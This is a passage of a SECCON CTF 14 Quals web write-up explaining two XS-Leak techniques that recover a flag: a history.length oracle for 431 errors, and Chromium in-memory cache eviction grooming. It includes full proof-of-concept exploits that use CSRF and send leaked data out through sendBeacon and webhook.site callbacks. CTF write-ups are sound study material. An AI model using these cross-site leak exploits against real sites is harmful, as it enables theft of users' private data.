![In a local environment, when sending a query of size 15,787 and searching for the FLAG value (413 response)](/[ENG]%202025%20SECCON%20CTF%2014%20Quals%20WEB%20Writeup/image%2014.png)

In a local environment, when sending a query of size 15,787 and searching for the FLAG value (413 response)

As shown in the Burp Suite packet above, when the request includes the FLAG, the length of the `If-None-Match` header increases by 1, which causes a 413 error to be triggered.

![image.png](/[ENG]%202025%20SECCON%20CTF%2014%20Quals%20WEB%20Writeup/image%2015.png)

### Detecting a 431 Response Status

Then, how can we tell whether we received a 431 response status?

Normally, in browsers, when a page navigation occurs, a new history entry is pushed, causing `history.length += 1`.

However, in Chromium, there are cases where the navigation results in a **replace** rather than a push, as shown below.

[https://chromium.googlesource.com/chromium/src/%2B/refs/heads/main/content/browser/renderer_host/navigation_request.cc#7020](https://chromium.googlesource.com/chromium/src/%2B/refs/heads/main/content/browser/renderer_host/navigation_request.cc#7020)

```jsx
 blink::mojom::NavigationApiEntryRestoreReason reason =
          common_params_->should_replace_current_entry
              ? blink::mojom::NavigationApiEntryRestoreReason::
                    kPrerenderActivationReplace
              : blink::mojom::NavigationApiEntryRestoreReason::
                    kPrerenderActivationPush;
```

[https://chromium.googlesource.com/chromium/src/%2B/refs/heads/main/content/browser/renderer_host/navigation_request.cc#6340](https://chromium.googlesource.com/chromium/src/%2B/refs/heads/main/content/browser/renderer_host/navigation_request.cc#6340)

```jsx
  common_params_->should_replace_current_entry =
      ShouldReplaceCurrentEntryForFailedNavigation();
```

As shown above, `should_replace_current_entry` checks whether a navigation to the same URL is a failed navigation, and if it is, Chromium performs a **replace** instead of a **push**.

If, as in this challenge, the second request results in a 431 error, a replace occurs instead of a push. Therefore, across two navigations to the same URL, `history.length` increases by only 1.

In other words, the first request’s entry is replaced by the second request, so instead of increasing by 2 as it normally would, the history length increases by only 1.

Because `history.length` can be measured after navigating the window to `about:blank`, an attacker can check how much `history.length` increased to determine whether a 431 error occurred.

```html
<!doctype html>
<script type="module">
    let BASE_URL = "http://127.0.0.1:3000"

    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
    const debug = (o) => navigator.sendBeacon("/debug", JSON.stringify(o));

    const getUrl = (prefix, padLength, nonce) =>
    `${BASE_URL}/?query=${prefix}&${nonce+"X".repeat(padLength)}`;

    const got431 = async (prefix, padLength) => {

      const nonce = (Math.random() + "").padEnd(20, "0");
      const url = getUrl(prefix, padLength, nonce);

      let win = open("about:blank")

      const len1 = win.history.length;

      win.location = url;
      await sleep(100);
      win.location = url;
      await sleep(100);
      win.location = "about:blank";
      await sleep(100);
      const len2 = win.history.length;

      const diff = len2 - len1;
      // If a 431 error occurs: diff === 2
      // Otherwise: diff === 3

      console.log({ padLength, len1, len2, diff });
      return diff === 2;
    };

    await got431("dummy", 1);
    await got431("dummy", 20000);
</script>
</body>
```

![When `padLength` is large (triggering a 431 error), the `history.length` value is lower by 1.](/[ENG]%202025%20SECCON%20CTF%2014%20Quals%20WEB%20Writeup/image%2016.png)

When `padLength` is large (triggering a 431 error), the `history.length` value is lower by 1.

## Solver

The final exploit proceeds as follows:

1. Use CSRF to fill the notes with dummy entries (for each candidate prefix) so that the `Content-Length` becomes `fff`.
2. Pad the URL to bring the request size just below the 431 error threshold.
3. For each prefix, send the same request twice and measure `history.length` to determine whether a 431 error occurred.
4. If the difference in `history.length` is 2, treat that prefix as part of the FLAG.
5. Repeat steps 1–4 to recover the full FLAG.

Below is the PoC code provided by @Ark.

```html
<body>
  <form id="create" action="..." method="post" target="csrf">
    <input type="text" name="note" />
  </form>
  <script type="module">
    const BASE_URL = "http://web:3000";
    const CHARS = [..."_abcdefghijklmnopqrstuvwxyz"];

    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
    const debug = (o) => navigator.sendBeacon("/debug", JSON.stringify(o));
    // const debug = (o) => console.log(o);

    let known = new URLSearchParams(location.search).get("known") ?? "SECCON{";

    const csrfWin = open("about:blank", "csrf");
    const createNote = async (note) => {
      const form = document.forms[0];
      form.action = `${BASE_URL}/new`;
      form.note.value = note;
      form.submit();
      await sleep(100);
    };

    const prepared = new Set();
    const prepare = async (prefix) => {
      if (prepared.has(prefix)) return;
      prepared.add(prefix);

      const initialLen = 443;
      const part = "\n        <li>" + "</li>\n      ";

      let len = initialLen;
      while (16 ** 3 - len - part.length - 1 > 0) {
        const note = prefix.padEnd(
          Math.min(1024, 16 ** 3 - len - part.length - 1),
          "*"
        );
        len += note.length + part.length;
        await createNote(note);
      }
    };

    let win = open("about:blank");

    const getUrl = (prefix, padLength, nonce) =>
      `${BASE_URL}/?${new URLSearchParams({
        query: prefix,
        pad: nonce.padEnd(padLength, "x"),
      })}`;

    const got431 = async (prefix, padLength) => {
      await prepare(prefix);

      const nonce = (Math.random() + "").padEnd(20, "0");
      const url = getUrl(prefix, padLength, nonce);

      const len1 = win.history.length;

      win.location = url;
      await sleep(100);
      win.location = url;
      await sleep(100);
      win.location = "about:blank";
      await sleep(100);
      const len2 = win.history.length;

      const diff = len2 - len1;
      // If a 431 error occurs: diff === 2
      // Otherwise: diff === 3

      if (len2 > 45) {
        // In Chromium, the maximum number of `history.length` is 50.
        // ref. https://source.chromium.org/chromium/chromium/src/+/df9f2fd80f9b8697c877c2c7e7f19d9f389291b8:third_party/blink/public/common/history/session_history_constants.h;l=11
        win.close();
        win = open("about:blank");
        await sleep(100);
      }

      debug({ prefix, len1, len2, diff });
      return diff === 2;
    };

    let left = 10000;
    let right = 18000;
    const getThreshold = async () => {
      left -= 50;
      while (right - left > 1) {
        const mid = (right + left) >> 1;
        if (await got431(known + "X", mid)) {
          right = mid;
        } else {
          left = mid;
        }
      }

      return left;
    };

    while (true) {
      const threshold = await getThreshold();
      debug({ length: known.length, threshold });
      let exists = false;
      for (const c of CHARS) {
        if (await got431(known + c, threshold)) {
          known += c;
          exists = true;
          navigator.sendBeacon("/leak", known);
          break;
        }
      }
      if (!exists) break;
    }

    const flag = known + "}";
    navigator.sendBeacon("/flag", flag);
  </script>
</body>
```

In this PoC, each time the main loop runs, it calls `getThreshold()` to compute—via binary search—the `padLength` threshold at which 431 errors begin to occur.

![image.png](/[ENG]%202025%20SECCON%20CTF%2014%20Quals%20WEB%20Writeup/image%2017.png)

FLAG : `SECCON{lumiose_city}`

## Unintended Solution

In addition to the ETag-Length XS-Leak technique described above, the challenge’s only solver, @parrot409, solved the problem by leveraging the cache eviction behavior of Chromium’s in-memory disk cache.

[https://gist.github.com/parrot409/e3b546d3b76e9f9044d22456e4cc8622](https://gist.github.com/parrot409/e3b546d3b76e9f9044d22456e4cc8622)

### XS Leaks using in memory disk cache grooming

In Incognito mode and in a Puppeteer bot environment, a browsing context created via `createBrowsingContext` uses an **`in-memory disk cache`** whose capacity is much smaller than the normal on-disk cache.

If that cache reaches its capacity, how does Chrome evict entries?

By default, cache eviction follows an **LRU (Least Recently Used)** policy, removing the entries that were cached least recently (i.e., the oldest ones) first.

[https://chromium.googlesource.com/chromium/src/%2B/719a425c/net/disk_cache/memory/mem_backend_impl.h#67](https://chromium.googlesource.com/chromium/src/%2B/719a425c/net/disk_cache/memory/mem_backend_impl.h#67)

```c
  // Signals that an entry has been doomed, and so it should be removed from the
  // list of active entries as appropriate, as well as removed from the
  // |lru_list_|.
  void OnEntryDoomed(MemEntryImpl* entry);
```

By leveraging this property, we can determine whether the search query matched the FLAG.

When the query matches a substring of the FLAG, the resulting page is **larger** than when there is no match. As a result, a successful match consumes more cache capacity than a failed search.

Using this, the exploit flow is roughly as follows:

1. Repeatedly request arbitrary pages to preload enough dummy cache entries, grooming the cache to sit near its capacity threshold.
2. Visit the search page multiple times to test whether a specific character is contained in the FLAG (or whether a prefix match holds), so that the response-size difference between success and failure accumulates as a noticeable difference in total cache usage.
3. Check whether the initial reference entry (the “sentinel” page) is still present in the cache, and infer whether the character is part of the FLAG based on whether it was evicted.

The `in-memory disk cache` capacity is specified in the code below.

[https://chromium.googlesource.com/chromium/src/%2B/main/net/disk_cache/memory/mem_backend_impl.cc#27](https://chromium.googlesource.com/chromium/src/%2B/main/net/disk_cache/memory/mem_backend_impl.cc#27)

[https://chromium.googlesource.com/chromium/src/%2B/main/net/disk_cache/memory/mem_backend_impl.cc#75](https://chromium.googlesource.com/chromium/src/%2B/main/net/disk_cache/memory/mem_backend_impl.cc#75)

```c
const int kDefaultInMemoryCacheSize = 10 * 1024 * 1024;
...
bool MemBackendImpl::Init() {
  if (max_size_)
    return true;
  uint64_t total_memory = base::SysInfo::AmountOfPhysicalMemory().InBytes();
  if (total_memory == 0) {
    max_size_ = kDefaultInMemoryCacheSize;
    return true;
  }
  // We want to use up to 2% of the computer's memory, with a limit of 50 MB,
  // reached on system with more than 2.5 GB of RAM.
  total_memory = total_memory * 2 / 100;
  if (total_memory > static_cast<uint64_t>(kDefaultInMemoryCacheSize) * 5)
    max_size_ = kDefaultInMemoryCacheSize * 5;
  else
    max_size_ = static_cast<int32_t>(total_memory);
  return true;
}
```

By default, the cache size is set to **10MB**, and if physical memory is available, it uses **2% of the total RAM** (capped at **50MB**).

Therefore, we can assume the maximum capacity of the in-memory disk cache is roughly **50MB**, and groom the cache close to that threshold. However, trying to fill it to exactly 50MB can make the outcome unstable due to non-deterministic factors such as network latency, concurrency, cache metadata overhead, and eviction timing.

Instead, we first fill the cache to around **49MB** to keep it just below the threshold, then add **~1KB-sized** entries to fine-tune the boundary. Next, we repeatedly visit the search page to test whether a specific character is present (amplifying the cumulative cache-usage difference). Finally, we probe whether the initially inserted sentinel page is still cached—using a method like `only-if-cached`—and determine whether the character is part of the FLAG based on whether it was evicted.

## Unintended Solver

@parrot409 performed the exploit steps outlined below.

1. push 1 entry of size 1b
2. push 49 entries of size 1mb
3. push 599 entries of size 1kb
4. push `//challenge.com/search?query=SECCON&i` for `i` from 0 to 200 with window.location
5. query the disk cache to see if the first entry we pushed is purged

The full PoC code is as follows.

```jsx
const express = require("express");
const app = express();
const port = 3008;

app.use(express.json());

app.get("/gg", (req, res) => {
  res.send(`A`.repeat(1 * 1024 * 1024));
});
app.get("/rr", (req, res) => {
  res.send(`A`.repeat(1));
});
app.get("/vaaa", (req, res) => {
  console.log(req.query);
  res.send(`A`.repeat(1024));
});
app.get("/", (req, res) => {
  if (!req.query.prefix || !req.query.check) return res.send("no");
  console.log("bot");
  res.send(`
<script>      
let x = window.open()
const flag = '${req.query.prefix}'
const check = '${req.query.check}'
async function df(){ 
        console.log('doing')
        await fetch('/rr',{cache:'force-cache'})
        for(i=0;i<49;i++) fetch('http://xxx.xx.xxx.xx:5000/gg?'+i+'&'+'A'.repeat(52-flag.length),{cache:'force-cache'})
        for(i=0;i<599;i++) fetch('http://xxx.xx.xxx.xx:5000/vaaa?'+i+'&'+'A'.repeat(52-flag.length),{cache:'force-cache'})
        await new Promise(r => setTimeout(r, 10000)); // sleeps for 1 second
        for(i=0;i<200;i++){                     
                let u = 'http://web:3000/?query='+flag+check+'&'+i+'&'
                x.location = u.padEnd(87,'A')
                await new Promise(r => setTimeout(r, 30)); // sleeps for 1 second
        }
        try{
                await fetch('/rr',{cache: 'only-if-cached', mode: 'same-origin' })
                fetch('https://webhook.site/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx?not-correct-${
                  req.query.prefix + req.query.check
                }')
        } catch(e){
               fetch('https://webhook.site/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx?found-${
                 req.query.prefix + req.query.check
               }')
        }
        console.log('done')
}
df()
</script>
`);
});
app.listen(5000);
```

※ In the Fetch API, `only-if-cached` causes a request to fail if the resource you’re trying to load is not already cached.
